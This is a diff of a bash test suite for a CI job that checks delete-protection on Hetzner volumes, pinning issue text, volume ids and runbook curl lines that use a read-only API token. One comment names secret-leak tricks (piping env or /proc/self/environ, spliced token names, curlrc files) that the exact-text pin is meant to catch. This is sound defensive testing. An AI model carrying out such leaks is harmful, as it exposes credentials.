+a "issues filed" "$(issues 'length')" 1; a "title" "$(issues '.[0].title')" "$TITLE_DIFF"
+a "labels" "$(issues '.[0].labels | sort | join(",")')" "action-required,infra-drift,priority/p1-high"; a "milestone" "$(issues '.[0].milestone')" "Post-MVP / Later"
+FB=$(issues '.[0].body')
+arm_exact "$FB" "$LEAD_DIFF" "$REMEDY_DIFF" "$DECISION"; no_other_words "the body" "$FB"
+a "email subject, exactly" "$(jq -r '.steps.notify.with.subject' "$CASE/result.json")" "[INFRA DRIFT] web-1 workspaces volume protection check needs attention"
+a "email body names the web-1 volume" "$(jq -r '.steps.notify.with.body' "$CASE/result.json" | grep -c '<strong>The twice-daily web-1 workspaces volume protection check needs attention.</strong>')" 1
+a "email body names ADR-119" "$(jq -r '.steps.notify.with.body' "$CASE/result.json" | grep -c 'carries the facts and the pointers (ADR-119)')" 1
+no_other_words "the email" "$(jq -r '.steps.notify.with.subject, .steps.notify.with.body' "$CASE/result.json")"
+end_row WF1 "web-1 first lifted run: ONE p1 issue with the web-1 title, labels, milestone, the exact lead, remedy (ADR-119 D1, the read-back subsection) and decision lines and no Inngest wording; the email names the web-1 volume and ADR-119 and no Inngest pointer"
+for _vd in lifted-outside-terraform volume-not-found no-token could-not-read; do
+  # In THIS shell (not a command substitution), so the filed title is read from the render's own scenario and the render
+  # cases' invariants fold into the row.
+  render_body "$_vd" 1 > "$TMP/wf12.1"; _t1=$(issues '.[0].title')
+  render_body "$_vd" 2 > "$TMP/wf12.2"; _b1=$(cat "$TMP/wf12.1"); _b2=$(cat "$TMP/wf12.2"); CHK=""
+  _n1=$(sed -e 's/zzn1/@/g; s/401/@/g; s/771/@/g' <<<"$_b1" | sed -E 's|actions/runs/[0-9]+|@|'); _n2=$(sed -e 's/zzn2/@/g; s/402/@/g; s/772/@/g' <<<"$_b2" | sed -E 's|actions/runs/[0-9]+|@|')
+  if [[ -z "$_b1" ]]; then CHK+=$'\n    '"no body was filed"; fi
+  if [[ "$_n1" != "$_n2" ]]; then CHK+=$'\n    '"the body differs in more than the named fields"; fi
+  if ! grep -q -e 'zzn1' -e 'HTTP code: 401' <<<"$_b1"; then CHK+=$'\n    '"neither the volume name nor the HTTP code is in the body (the render did not reach the filer)"; fi
+  if recipe_vocab "$_b1"; then CHK+=$'\n    '"the body holds recipe vocabulary or a Hetzner id"; fi
+  if grep -qiE -- "$OTHER_WORDS" <<<"$_b1"; then CHK+=$'\n    '"the web-1 body names the Inngest volume, its ADR or its runbook"; fi
+  a "the filed title is a web-1 title" "$(grep -c '^infra: \(the \)\{0,1\}web-1 workspaces volume ' <<<"$_t1")" 1
+  end_row "WF12/$_vd" "web-1: the rendered filer body has only the named dynamic fields, no recipe vocabulary, no id and no Inngest wording"
+done
+new_scen; new_case; listing > "$CASE/listing.json"; go
+a "vnf title" "$(issues '.[0].title')" "$TITLE_GONE"; a "vnf labels" "$(issues '.[0].labels | sort | join(",")')" "action-required,infra-drift,priority/p1-high"
+a "reason pointer" "$(issues '.[0].body' | grep -c 'names the reason (zero, many or id-mismatch)')" 1
+a "confirm before escalating" "$(issues '.[0].body' | grep -c '^Confirm the Hetzner listing first')" 1
+a "no Inngest runbook section" "$(issues '.[0].body' | grep -c 'After a total loss')" 0
+arm_exact "$(issues '.[0].body')" "$LEAD_GONE" "$REMEDY_GONE" "$DECISION"; no_other_words "the body" "$(issues '.[0].body')"
+end_row WX5 "web-1 volume-not-found issue: the web-1 title, p1 labels, the reason pointer, the exact lead, remedy (soleur:incident and the ADR-119 loss modes) and decision lines, and no Inngest wording"
+new_scen; new_case; CODES=401; go
+UB=$(issues '.[0].body')
+a "title" "$(issues '.[0].title')" "$TITLE_NOCRED"
+a "names the web-1 volume" "$(grep -c "the web-1 workspaces volume's delete-protection flag" <<<"$UB")" 1
+a "ADR pointer" "$(grep -cF 'Decision record: ADR-119.' <<<"$UB")" 1; no_other_words "the no-token body" "$UB"
+_keep="$CHK"; new_scen; new_case; CODES=500; go; CHK+="$_keep"
+a "could-not-read title" "$(issues '.[0].title')" "$TITLE_UNREAD"
+a "could-not-read body names ADR-119" "$(issues '.[0].body' | grep -cF 'Decision record: ADR-119.')" 1
+no_other_words "the could-not-read body" "$(issues '.[0].body')"
+end_row WX9 "web-1 could-not-perform bodies (no-token, could-not-read) name the web-1 volume and ADR-119, never ADR-282"
+switch_entry inngest
+new_scen; new_case; live false; OVR+=("file_finding:VERDICT=bogus"); go
+a "finding filer outcome (unknown verdict)" "$(rs file_finding outcome)" failure; a "finding filer rc" "$(rs file_finding rc)" 1
+a "one slug line" "$(grep -c '^::error::sole_copy_finding_filer_unexpected_verdict' "$CASE/file_finding.log")" 1
+a "the slug names entry:verdict" "$(grep '^::error::sole_copy_finding_filer_unexpected_verdict' "$CASE/file_finding.log" | grep -cF '(inngest:bogus)')" 1
+a "no issue filed" "$(issues 'length')" 0
+a "the email names the failed finding filer" "$(jq -r '.steps.notify.with.body' "$CASE/result.json" | grep -c 'finding filer <code>failure</code>')" 1
+_keep="$CHK"
+new_scen; new_case; live false; OVR+=("file_finding:ENTRY=zzz"); go; CHK+="$_keep"
+a "finding filer outcome (unknown entry)" "$(rs file_finding outcome)" failure; a "finding filer rc" "$(rs file_finding rc)" 1
+a "one slug line" "$(grep -c '^::error::sole_copy_finding_filer_unexpected_verdict' "$CASE/file_finding.log")" 1
+a "the slug names entry:verdict" "$(grep '^::error::sole_copy_finding_filer_unexpected_verdict' "$CASE/file_finding.log" | grep -cF '(zzz:lifted-outside-terraform)')" 1
+a "no issue filed" "$(issues 'length')" 0
+a "the email names the failed finding filer" "$(jq -r '.steps.notify.with.body' "$CASE/result.json" | grep -c 'finding filer <code>failure</code>')" 1
+end_row WX16 "the finding filer's catch-all: an unknown verdict and an unknown entry each print the slug with entry:verdict, file nothing, reach the email and fail the step"
+
+# ---------------------------------------------------------------------------------------------------------
+echo "C: cross-entry isolation (both directions; one shared issue store per row)"
+# ---------------------------------------------------------------------------------------------------------
+titles_of() { # titles_of <entry> [nu]: that entry's four titles, or (nu) its two (name-unreadable) forms; in a subshell
+  use_entry "$1"
+  if [[ "${2-}" == nu ]]; then printf '%s\n' "${TITLE_NOCRED/"($NAME)"/(name-unreadable)}" "${TITLE_UNREAD/"($NAME)"/(name-unreadable)}"
+  else printf '%s\n' "$TITLE_DIFF" "$TITLE_GONE" "$TITLE_NOCRED" "$TITLE_UNREAD"; fi
+}
+seed_issue() { # seed_issue <title>: an open, bot-authored infra-drift issue (every filter the clear step applies would act on it)
+  jq --arg t "$1" '. + [{number: ((map(.number) | max // 0) + 1), title: $t, state: "open", labels: ["infra-drift"], milestone: "", body: "seeded", author: "app/github-actions", comments: []}]' "$SCEN/issues.json" > "$SCEN/i.tmp" && mv "$SCEN/i.tmp" "$SCEN/issues.json"
+}
+seeded_open() { jq --arg b seeded '[.[] | select(.body == $b and .state == "open" and (.comments | length) == 0)] | length' "$SCEN/issues.json"; }
+_acc=""
+for _e in inngest web1; do
+  switch_entry "$_e"; new_scen
+  new_case; live false; set_age 180; set_age_other 5; go
+  a "$_e: own file 3 h old, other file 5 min old -> files" "$(sed -n 's/^verdict=//p' "$CASE/out/probe")" lifted-outside-terraform
+  a "$_e: the own file's commit time was served" "$(grep -c '^epoch=[0-9]' "$CASE/out/tf_commit" 2>/dev/null)" 1
+  _ta=$(sed -n 's/^tf_age_min=//p' "$CASE/out/probe"); [[ "$_ta" =~ ^[0-9]+$ ]] && (( _ta >= 179 )) || CHK+=$'\n    '"$_e: the age is not the own file's (tf_age_min='$_ta', want >= 179)"
+  fold_inv; _acc+="$INV_ACC$CHK"; INV_ACC=""; CHK=""
+  new_case; live false; set_age 5; set_age_other 180; go
+  a "$_e: own file 5 min old, other file 3 h old -> pending" "$(sed -n 's/^verdict=//p' "$CASE/out/probe")" lift-pending-apply
+  fold_inv; _acc+="$INV_ACC$CHK"; INV_ACC=""; CHK=""
+done
+CHK="$_acc"; end_row C3 "grace isolation: each leg reads its own declaration file's commit time (the other file's recent commit neither opens nor closes the grace)"
+_acc=""
+for _e in inngest web1; do
+  switch_entry "$_e"; _o="$OTHER_ENTRY"; new_scen
+  while IFS= read -r _t; do seed_issue "$_t"; done < <(titles_of "$_o"; titles_of "$_o" nu)
+  new_case; go
+  a "$_e clean run: the other leg's six issues (four titles and two (name-unreadable) forms) stay open and uncommented" "$(seeded_open)" 6
+  fold_inv; _acc+="$INV_ACC$CHK"; INV_ACC=""; CHK=""
+  switch_entry "$_o"; new_case; go
+  a "positive control: a clean $_o run closes its own six" "$(seeded_open)" 0
+  a "each with exactly one 'cleared in run' comment" "$(jq '[.[] | select(.body == "seeded" and .state == "closed" and (.comments | length) == 1 and (.comments[0] | startswith("cleared in run https://github.com/o/r/actions/runs/77: live equals declared")))] | length' "$SCEN/issues.json")" 6
+  fold_inv; _acc+="$INV_ACC$CHK"; INV_ACC=""; CHK=""
+done
+CHK="$_acc"; end_row C4 "clear isolation on one shared issue store: a clean run of one leg leaves all six of the other leg's titles (the (name-unreadable) forms included) open and uncommented, and that leg's own clean run closes each with one cleared comment"
+_acc=""
+for _e in inngest web1; do
+  switch_entry "$_e"; _o="$OTHER_ENTRY"; new_scen
+  while IFS= read -r _t; do seed_issue "$_t"; done < <(titles_of "$_o" | sed -n '3,4p')
+  new_case; CODES=500; go; new_case; CODES=401; go
+  a "$_e could-not-perform: the other leg's two issues are not commented" "$(seeded_open)" 2
+  a "$_e files its own could-not-read issue" "$(jq --arg t "$TITLE_UNREAD" '[.[] | select(.title == $t and .state == "open")] | length' "$SCEN/issues.json")" 1
+  a "$_e files its own no-token issue" "$(jq --arg t "$TITLE_NOCRED" '[.[] | select(.title == $t and .state == "open")] | length' "$SCEN/issues.json")" 1
+  fold_inv; _acc+="$INV_ACC$CHK"; INV_ACC=""; CHK=""
+  switch_entry "$_o"; new_case; go
+  a "positive control: a clean $_o run closes its own two" "$(seeded_open)" 0
+  a "and leaves the $_e leg's two open" "$(jq '[.[] | select(.body != "seeded" and .state == "open")] | length' "$SCEN/issues.json")" 2
+  fold_inv; _acc+="$INV_ACC$CHK"; INV_ACC=""; CHK=""
+done
+CHK="$_acc"; end_row C6 "could-not-perform isolation: each leg files and dedupes under its own two titles only"
+switch_entry inngest; _iall=$( { titles_of inngest; titles_of inngest nu; } )
+switch_entry web1; new_scen
+while IFS= read -r _t; do seed_issue "$_t"; done <<<"$_iall"
+new_case; JOB_STATUS=cancelled; go
+a "the probe is skipped on a cancelled leg" "$(rs probe ran)" false; a "the could-not-perform filer ran" "$(rs file_unreadable outcome)" success
+a "every Inngest issue is untouched" "$(seeded_open)" 6
+a "one new issue" "$(jq '[.[] | select(.body != "seeded")] | length' "$SCEN/issues.json")" 1
+a "under the web-1 (name-unreadable) title" "$(jq -r '[.[] | select(.body != "seeded")][0].title' "$SCEN/issues.json")" "$(titles_of web1 nu | sed -n 2p)"
+a "gate red" "$(rs gate rc)" 1
+end_row C9 "a cancelled web-1 leg files only under the web-1 (name-unreadable) title and leaves every Inngest title alone"
+new_scen; new_case; rm -rf -- "$WS/.git"; FORCE+=("anon=failure"); go
+a "the checkout failed" "$(rs anon outcome)" failure; a "the probe is skipped" "$(rs probe ran)" false
+a "the could-not-perform filer succeeded without a checkout" "$(rs file_unreadable outcome)" success
+a "one p2 issue" "$(issues 'length')" 1; a "under the web-1 (name-unreadable) title" "$(issues '.[0].title')" "$(titles_of web1 nu | sed -n 2p)"
+a "p2" "$(issues '.[0].labels | index("priority/p2-medium") != null')" true
+end_row C10 "a web-1 leg whose checkout failed still files its p2 (name-unreadable) issue: the filers name the repository through GH_REPO"
+switch_entry inngest
+
+# ---------------------------------------------------------------------------------------------------------
 echo "P: pins"
 # ---------------------------------------------------------------------------------------------------------
-_pin=$(sed -n 's/^readonly VOLUME_ID_PIN=\([0-9]*\).*/\1/p' "$TMP/x/steps/probe.sh")
+_pin=$(jq -r '[.[] | objects | select(.entry == "inngest") | .volume_id] | if length == 1 then .[0] | tostring else "" end' "$TMP/x/rows.json")
+_wpin=$(jq -r '[.[] | objects | select(.entry == "web1") | .volume_id] | if length == 1 then .[0] | tostring else "" end' "$TMP/x/rows.json")
 _adr="$REPO_ROOT/knowledge-base/engineering/architecture/decisions/ADR-282-sole-copy-luks-volume-protection-set.md"
 _rb=$(grep -F -e '--only-secrets HCLOUD_TOKEN_READONLY' "$RUNBOOK" | grep -o 'v1/volumes/[0-9]*' | sort -u | tr '\n' ' ')
-if [[ "$_pin" == "$VOL_ID" && -f "$_adr" ]] && grep -qF "Hetzner id $_pin" "$_adr" && grep -qF "$_pin" "$SKILL" && [[ "$_rb" == "v1/volumes/$_pin " ]]; then pass "N1 VOLUME_ID_PIN ($_pin) equals the id in ADR-282, in the postmerge skill's section-5c one-liner and in the runbook's section-5c one-liner"
-else fail "N1 VOLUME_ID_PIN='$_pin' does not equal the ADR-282 / postmerge skill / runbook one-liner id (runbook: '$_rb')"; fi
-# N1b: the pin has exactly THREE consumers in the workflow (this probe and the two orphan sweeps), comment-stripped so a comment quoting
-# the name does not count. An exact count, not a floor: a deleted copy (a sweep that no longer proves the volume is visible) must be red.
+if [[ -n "$_pin" && "$_pin" == "$(use_entry inngest; printf '%s' "$VOL_ID")" && -f "$_adr" ]] && grep -qF "Hetzner id $_pin" "$_adr" && grep -qF "$_pin" "$SKILL" && [[ "$_rb" == "v1/volumes/$_pin " ]]; then pass "N1 the inngest row's volume_id ($_pin) equals the id in ADR-282, in the postmerge skill's section-5c one-liner and in the runbook's section-5c one-liner"
+else fail "N1 the inngest row's volume_id='$_pin' does not equal the suite's Inngest id / ADR-282 / postmerge skill / runbook one-liner id (runbook: '$_rb')"; fi
+# N1b: the workflow carries exactly TWO comment-stripped pin literals (the two orphan sweeps), both equal to the inngest row's
+# volume_id. A literal inside the sole-copy job itself is an id-placement violation (S1). An exact count, not a floor: a deleted
+# copy (a sweep that no longer proves the volume is visible) must be red.
 _pins=$(grep -v '^[[:space:]]*#' "$WF" | grep -E '^[[:space:]]*readonly VOLUME_ID_PIN=[0-9]+' | sed -E 's/^[[:space:]]*readonly VOLUME_ID_PIN=([0-9]+).*/\1/') || _pins=""
 _npins=$(grep -c . <<<"$_pins") || _npins=0
 _upins=$(sort -u <<<"$_pins")
-if [[ "$_npins" == 3 && "$_upins" == "$_pin" ]]; then pass "N1b the workflow carries exactly 3 VOLUME_ID_PIN copies (the probe and the two orphan sweeps), all equal to ${_pin}"
-else fail "N1b the workflow carries ${_npins} VOLUME_ID_PIN copies with values [$(tr '\n' ' ' <<<"$_upins")], want exactly 3 equal to '${_pin}'"; fi
+if [[ -n "$_pin" && "$_npins" == 2 && "$_upins" == "$_pin" ]]; then pass "N1b the workflow carries exactly 2 VOLUME_ID_PIN literals (the two orphan sweeps), both equal to the inngest row's volume_id ${_pin}"
+else fail "N1b the workflow carries ${_npins} VOLUME_ID_PIN literals with values [$(tr '\n' ' ' <<<"$_upins")], want exactly 2 equal to the inngest row's '${_pin}'"; fi
+# N1c: the web1 row's pin is anchored OUTSIDE the workflow, to ADR-119's 2026-11-10 addendum (section-bounded: a mention anywhere
+# else in the file cannot satisfy it) and to runbook 6604's read-only read-back line; every OTHER read-only line of runbook 6604
+# that names a volume id (the "Verify the retired end state" GETs included) names the pin too; and it differs from the inngest row's.
+adr_section() { awk '/^## Addendum — 2026-11-10 \(#10432/{f=1; next} /^## /{f=0} f' "$1"; }
+rb_section() { awk '/^## Read back the delete-protection flag \(read-only token\)$/{f=1; next} /^## /{f=0} f' "$1"; }
+vb_section() { awk '/\*\*Verify the retired end state/{f=1} f && /^   > /{exit} f' "$1"; }
+n1c() { # n1c <adr-119> <runbook-6604> <web1-pin> <inngest-pin>: prints one line per disagreement, nothing when all agree
+  local _a _l _r _f _g
+  _a=$(adr_section "$1" | grep -oE 'Hetzner id `?[0-9]+`?' | tr -d '`') || _a=""
+  [[ "$(grep -c . <<<"$_a")" == 1 && "$_a" == "Hetzner id $3" ]] || printf 'ADR-119 addendum of 2026-11-10: want exactly one "Hetzner id %s", got [%s]\n' "$3" "$(tr '\n' ';' <<<"$_a")"
+  _l=$(rb_section "$2" | grep -F -e '--only-secrets HCLOUD_TOKEN_READONLY') || _l=""
+  _r=$(grep -oE 'v1/volumes/[0-9]+' <<<"$_l") || _r=""
+  [[ "$(grep -c . <<<"$_l")" == 1 && "$(grep -c . <<<"$_r")" == 1 && "$_r" == "v1/volumes/$3" ]] || printf 'runbook 6604 read-back: want one read-only line naming exactly v1/volumes/%s, got %s line(s) [%s]\n' "$3" "$(grep -c . <<<"$_l")" "$(tr '\n' ';' <<<"$_r")"
+  # File-wide, like N1 for runbook 6894: the ids every read-only line names (a v1/volumes/<id> GET, or the `expect [<id>]` of a
+  # server's attached volumes) are exactly {pin}. The one exception is a GET that expects 404 (the retired plaintext volume), and
+  # that GET must not name the pin.
+  _f=$(grep -F -e '--only-secrets HCLOUD_TOKEN_READONLY' "$2" | grep -vE "v1/volumes/[0-9]+'[[:space:]]+# expect 404\$" \
+    | grep -oE '(v1/volumes/|expect \[)[0-9]+\]?' | grep -oE '[0-9]+\]?$' | tr -d ']' | sort -u) || _f=""
+  [[ "$_f" == "$3" ]] || printf 'runbook 6604 read-only lines: want every volume id they name to be %s, got [%s]\n' "$3" "$(tr '\n' ';' <<<"$_f")"
+  _g=$(grep -F -e '--only-secrets HCLOUD_TOKEN_READONLY' "$2" | grep -E "v1/volumes/[0-9]+'[[:space:]]+# expect 404\$" | grep -cF "v1/volumes/$3'") || _g=0
+  [[ "$_g" == 0 ]] || printf 'runbook 6604: a read-only GET that expects 404 names the pin %s\n' "$3"
+  [[ -n "$3" && "$3" != "$4" ]] || printf 'the web1 pin is empty or equals the inngest pin (%s)\n' "$4"
+}
+_n1c=$(n1c "$ADR119" "$RB6604" "$_wpin" "$_pin")
+if [[ -z "$_n1c" && "$_wpin" == "$(use_entry web1; printf '%s' "$VOL_ID")" ]]; then pass "N1c the web1 row's volume_id ($_wpin) equals the one 'Hetzner id' of ADR-119's 2026-11-10 addendum, the read-only read-back line of runbook 6604 and every other read-only line of that runbook naming a volume id, and differs from the inngest row's"
+else fail "N1c the web1 row's volume_id '$_wpin' is not anchored: ${_n1c:-it differs from the web-1 id of use_entry}"; fi
 _dl=$(python3 -I - "$LOADER" "$TMP/x/job.json" <<'PYP'
 import json, sys, yaml
 steps = yaml.safe_load(open(sys.argv[1]))["runs"]["steps"]
@@ -1421,6 +2109,41 @@ PYP
 ) || _dl=error
 if [[ "$_dl" == same ]] && grep -qxF -- 'echo "${DOPPLER_CLI_SHA256}  $d/doppler.tar.gz" | sha256sum -c -' "$TMP/x/steps/doppler_cli.sh" && grep -qxF -- 'echo "$d" >> "$GITHUB_PATH"' "$TMP/x/steps/doppler_cli.sh"; then pass "N2 the job's Doppler CLI version and sha256 equal the loader's, and the tarball is verified with sha256sum -c"
 else fail "N2 Doppler CLI pin: $_dl"; fi
+# The read-only command lines of runbook 6604 (the read-back subsection's one `doppler run` line, and the four of "Verify the retired
+# end state"; only those two fenced blocks, so the outcome table and the prose may still name the flags and say it does not fall back).
+# Pinned as an EXACT text, never a grammar or a list of banned spellings (review verification pass, V3): the read-back
+# section's first fenced block holds exactly RB line R, and the verify block's first fenced block exactly lines V1-V4, byte for
+# byte once the fence's own indentation is removed; the only slot is the web1 pin, read from the workflow row. What this
+# guarantees: any other text in either block (a second command, `env`/`printenv`/`/proc/self/environ` piped anywhere, a
+# spliced token name, a curlrc written and exported, an argv header in any spelling, a dropped `--disable`, another
+# wrapper or quoting) is a diff from the pin and reds N3. What it relies on: `--disable --noproxy "*"` first, as
+# scripts/lib/bearer-curl.sh does, so curl reads no curlrc and honours no proxy variable from the operator's environment.
+# What it does not cover: the operator's own `doppler`, `sh`, `curl` and `jq` binaries and the rest of their environment
+# (the TLS trust store variables included), and prose outside the two blocks.
+RB_WRAP='doppler run -p soleur -c prd_terraform --only-secrets HCLOUD_TOKEN_READONLY --no-exit-on-missing-only-secrets -- sh -c '"'"'[ -n "$HCLOUD_TOKEN_READONLY" ] || { echo missing-token; exit 3; }; '
+RB_HDR='printf "header = \"Authorization: Bearer %s\"\n" "$HCLOUD_TOKEN_READONLY" | curl --disable --noproxy "*" -sS --config - --max-time 30 '
+rb_expected() { # rb_expected <web1-pin>: the two blocks as rb_blocks prints them
+  local p="$1" q="'"
+  printf '%s\n' '@@read-back@@' \
+    "$RB_WRAP"'r=$('"$RB_HDR"'-w "\n%{http_code}" https://api.hetzner.cloud/v1/volumes/'"$p"') || { echo read-failed; exit 2; }; case "$(printf %s "$r" | tail -n 1)" in 200) w=$(printf %s "$r" | sed "\$d" | jq -r "if .volume.protection.delete == true then \"protected\" elif .volume.protection.delete == false then \"not-protected\" else \"read-failed\" end" 2>/dev/null);; 404) w=volume-gone;; *) w=read-failed;; esac; case "$w" in protected) echo protected;; not-protected) echo not-protected; exit 1;; volume-gone) echo volume-gone; exit 4;; *) echo read-failed; exit 2;; esac'"$q" \
+    '@@verify@@' \
+    "$RB_WRAP$RB_HDR"'-o /dev/null -w "%{http_code}\n" https://api.hetzner.cloud/v1/volumes/105149570'"$q"'   # expect 404' \
+    "$RB_WRAP$RB_HDR"'https://api.hetzner.cloud/v1/servers/123931471 | jq -c ".server.volumes"'"$q"'   # expect ['"$p"']' \
+    "$RB_WRAP$RB_HDR"'"https://api.hetzner.cloud/v1/volumes?name=soleur-web-platform-data" | jq -c "[.volumes[].id]"'"$q"'   # expect []' \
+    "$RB_WRAP$RB_HDR"'https://api.hetzner.cloud/v1/volumes/'"$p"' | jq ".volume.protection.delete"'"$q"'   # expect true after the SSH-stage apply'
+}
+fence1() { # fence1: stdin's first fenced block, each line with the opening fence's indentation removed (a line without it is marked)
+  awk 'f == 0 && /^[ ]*```/ { match($0, /^[ ]*/); ind = substr($0, 1, RLENGTH); f = 1; next }
+       f == 1 && /^[ ]*```[ ]*$/ { exit }
+       f == 1 { if (substr($0, 1, length(ind)) == ind) print substr($0, length(ind) + 1); else print "@@indent@@" $0 }'
+}
+rb_blocks() { # rb_blocks <runbook-6604>
+  printf '%s\n' '@@read-back@@'; rb_section "$1" | fence1
+  printf '%s\n' '@@verify@@'; vb_section "$1" | fence1
+}
+rb_cmdline_ok() { # rb_cmdline_ok <runbook-6604> <web1-pin>: 0 when both blocks are exactly the pinned text
+  [[ -n "$2" && "$(rb_blocks "$1")" == "$(rb_expected "$2")" ]]
+}
 _ff=$(cat "$TMP/x/steps/file_finding.sh"); _fu=$(cat "$TMP/x/steps/file_unreadable.sh")
 _n3=""
 n3() { if ! "$@" >/dev/null 2>&1; then _n3+=" [$*]"; fi; }   # a failed pointer is named in the failure line
@@ -1437,14 +2160,55 @@ n3 grep -qF 'After a total loss' <<<"$_ff"
 n3 grep -qF 'soleur:incident' <<<"$_ff"
 n3 grep -qF 'table row \`not-protected\`' <<<"$_ff"
 n3 grep -qF '\`manual-rerun\` dispatch' <<<"$_ff"
-n3 grep -qF 'ADR-282' <<<"$_fu"
+n3 grep -qF 'Decision record: ${ADR}.' <<<"$_fu"
 n3 grep -qF 'infra-credential-tiers-8209.md' <<<"$_fu"
-if [[ -z "$_n3" ]]; then pass "N3 every pointer the filer text makes resolves: ADR-282, runbook 5c, its not-protected row, the Delivery route text naming manual-rerun, After a total loss, the soleur:incident skill file, step O5 of infra-credential-tiers-8209.md"
+while IFS= read -r _ad; do
+  n3 compgen -G "$REPO_ROOT/knowledge-base/engineering/architecture/decisions/${_ad:-none}-*.md"
+done < <(jq -r '.[] | objects | .adr // "none"' "$TMP/x/rows.json")
+n3 grep -qF 'D1 — the sole copy is protected in Terraform' "$ADR119"
+n3 grep -q '^## Addendum (2026-10-08): the plaintext backstop is retired' "$ADR119"
+n3 test "$(grep -cx '## Read back the delete-protection flag (read-only token)' "$RB6604")" = 1
+n3 rb_cmdline_ok "$RB6604" "$_wpin"
+if [[ -z "$_n3" ]]; then pass "N3 every pointer the filer text makes resolves: ADR-282, runbook 5c, its not-protected row, the Delivery route text naming manual-rerun, After a total loss, the soleur:incident skill file, step O5 of infra-credential-tiers-8209.md, every row's ADR file, ADR-119 D1 and its 2026-10-08 addendum, runbook 6604's read-only read-back section, and its read-back and verify blocks equal to the pinned five lines"
 else fail "N3 a filer pointer does not resolve:$_n3"; fi
+# N4 (CTO rulings 20 and 28): the web-1 re-protect forcing function is stated the same way in ADR-119's 2026-11-10 addendum and in
+# the sole-copy job's OWN comment block (the run of comment lines directly above the job header, after the last blank or
+# non-comment line; another job's comment cannot satisfy it): the lift PR's dated re-protect follow-through issue, whose probe is
+# event-grep (never the Date shape) on the web1 leg's matches-declared marker, never Guard B4 (B4 only makes the lift reviewed).
+# Wrapped lines are joined first, so a line break inside a phrase cannot hide it.
+job_comment() { # job_comment <workflow>: the sole-copy job's own comment block, joined
+  awk '/^  sole-copy-protection-check:/{printf "%s", b; exit} /^[[:space:]]*#/{b = b $0 "\n"; next} {b = ""}' "$1" \
+    | sed -E 's/^[[:space:]]*# ?//' | tr '\n' ' ' | tr -s ' '
+}
+# Both texts also state the probe's exit codes and leg condition in ruling 28's exact words (review verification pass, V5): the
+# leg "succeeded and emitted" the marker, and the past-date exit is 5 ("after it 5 (ACTION REQUIRED)" in the addendum, "5 after
+# it" in the job comment), so an edit back to a Date-shape closure (exit 0 past the date, or a leg that merely ran) is red.
+N4_NEED=('dated re-protect follow-through issue' 'never the Date shape' 'sole-copy-check verdict=matches-declared entry=web1' 'succeeded and emitted')
+N4_NEED_ADR=('after it 5 (ACTION REQUIRED)')
+N4_NEED_JOB=('2 before the issue'"'"'s date and 5 after it')
+# The ruling's two literal forms of pairing B4 with "forcing function", and the Date-shape trigger phrases of the follow-through
+# convention (either preposition), case-insensitive. The either-order pairing is checked per sentence below.
+N4_BAN='forcing function is Guard B4|Guard B4 (is|as) (the|a|its) forcing function|Re-evaluate (by|on)'
+n4_sentences() { sed -E 's/\. /.\n/g'; }   # one sentence per line: split on a period followed by a space (a dotted path stays whole)
+n4() { # n4 <adr-119> <workflow>: prints one line per failure, nothing when both agree
+  local _s _t _p _need
+  for _s in adr job; do
+    if [[ "$_s" == adr ]]; then _t=$(adr_section "$1" | tr '\n' ' ' | tr -s ' '); _need=("${N4_NEED[@]}" "${N4_NEED_ADR[@]}")
+    else _t=$(job_comment "$2"); _need=("${N4_NEED[@]}" "${N4_NEED_JOB[@]}"); fi
+    for _p in "${_need[@]}"; do grep -qF -- "$_p" <<<"$_t" || printf '%s: lacks "%s"\n' "$_s" "$_p"; done
+    if grep -qiE -- "$N4_BAN" <<<"$_t"; then printf '%s: %s\n' "$_s" "$(grep -oiE -- "$N4_BAN" <<<"$_t" | head -1)"; fi
+    _p=$(n4_sentences <<<"$_t" | grep -wiE 'B4' | grep -iE 'forcing function' | head -1) || _p=""
+    [[ -z "$_p" ]] || printf '%s: a sentence pairs B4 with "forcing function": %s\n' "$_s" "$(head -c 160 <<<"$_p")"
+  done
+}
+_n4=$(n4 "$ADR119" "$WF")
+if [[ -z "$_n4" ]]; then pass "N4 ADR-119's 2026-11-10 addendum and the sole-copy job's own comment block both name the dated re-protect follow-through issue, its event-grep probe (never the Date shape), the web1 marker, a leg that succeeded and emitted it and exit 5 past the date, and neither pairs Guard B4 with 'forcing function' in one sentence or names the Date-shape trigger"
+else fail "N4 the web-1 re-protect forcing function: $(tr '\n' ';' <<<"$_n4")"; fi
 
 # ---------------------------------------------------------------------------------------------------------
 echo "H: harness rows -- the suite can see its own stub and its own comparison"
 # ---------------------------------------------------------------------------------------------------------
+new_scen   # a scenario of its own: nothing a table row left in the shared issue store (a stub refusal included) reaches these rows
 _pre=$ROWS_RUN
 listing "$(vol "$VOL_ID" "$NAME" true)" > "$TMP/force.json"
 _h1=0
@@ -1453,9 +2217,15 @@ for _r in r_lifted r_empty r_two r_nextpage; do
   EXTRA_ENV=("CURL_FORCE=$TMP/force.json"); "$_r"; _got="$CHK"; EXTRA_ENV=()
   if [[ -n "$_got" ]]; then _h1=$((_h1 + 1)); else echo "    $_r stayed green against a stub that always returns a matching fixture"; fi
 done
-ROWS_RUN=$_pre; INV_ACC=""; INV_DONE=1
-if [[ "$_h1" == 4 ]]; then pass "H1 a stub that always serves a matching fixture turns rows V2, V6, V7 and M1 RED (the suite sees its own stub)"
-else fail "H1 only $_h1 of 4 rows noticed a neutered stub"; fi
+INV_ACC=""; INV_DONE=1; use_entry web1
+listing "$(vol "$VOL_ID" "$NAME" true)" > "$TMP/force.web1.json"
+for _r in r_wlifted r_wempty r_wid; do
+  EXTRA_ENV=("CURL_FORCE=$TMP/force.web1.json"); "$_r"; _got="$CHK"; EXTRA_ENV=()
+  if [[ -n "$_got" ]]; then _h1=$((_h1 + 1)); else echo "    $_r stayed green against a stub that always returns a matching web-1 fixture"; fi
+done
+ROWS_RUN=$_pre; INV_ACC=""; INV_DONE=1; use_entry inngest
+if [[ "$_h1" == 7 ]]; then pass "H1 a stub that always serves a matching fixture turns rows V2, V6, V7, M1 and the web-1 rows WV2, WV6, WV8 RED (the suite sees its own stub)"
+else fail "H1 only $_h1 of 7 rows noticed a neutered stub"; fi
 new_case; tf "$NAME" false; live true; go
 CMP_MODE="exit"; want_out "${V}matches-declared"; _blind="$CHK"; CHK=""; CMP_MODE=full; want_out "${V}matches-declared|$OK_KEYS|live=true|volume_id=$VOL_ID|http=200"; _sees="$CHK"; CHK=""
 if [[ -z "$_blind" && -n "$_sees" && "$(rs gate rc)" == 0 ]]; then pass "H2 lift-not-applied and matches-declared both exit 0 and differ only in outputs: an exit-code-only comparison is blind, the full comparison is not"
